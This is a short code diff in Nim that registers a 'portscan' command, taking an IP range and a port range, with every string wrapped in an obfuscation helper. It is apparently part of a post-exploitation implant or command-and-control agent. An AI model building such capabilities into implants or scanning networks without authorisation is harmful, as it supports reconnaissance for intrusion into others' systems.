@@ -143,6 +143,19 @@ when defined(linux):
         )
     )
 
+    # portscan
+    commands.add(
+        Command(
+            command: obf("portscan"),
+            description: obf("Scan a range of ports on a range of IPs"),
+            args: @[
+                CommandArgument(name: obf("ip_range"), arg_type: obf("str"), description: obf("The IP range to scan"), required: true),
+                CommandArgument(name: obf("port_range"), arg_type: obf("str"), description: obf("The port range to scan"), required: true)
+            ],
+            function: shared.portScan
+        )
+    )
+
     # pid
     commands.add(
         Command(
